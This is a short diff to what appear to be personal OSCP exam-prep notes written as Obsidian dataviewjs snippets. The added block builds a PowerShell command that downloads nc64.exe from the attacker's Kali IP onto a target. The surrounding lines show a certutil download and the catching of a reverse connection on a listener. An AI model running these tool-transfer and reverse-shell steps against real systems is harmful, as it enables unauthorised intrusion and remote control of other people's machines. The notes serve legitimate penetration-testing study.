@@ -104,6 +104,17 @@ const command = `C:\\\Windows\\\System32\\\certutil.exe -urlcache -split -f http
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+OR
+
+Powershell nc64
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `powershell -c "iwr -uri http://${KaliIP}/nc64.exe -OutFile nc.exe"`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
 Catch a reverse connection on the listener
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
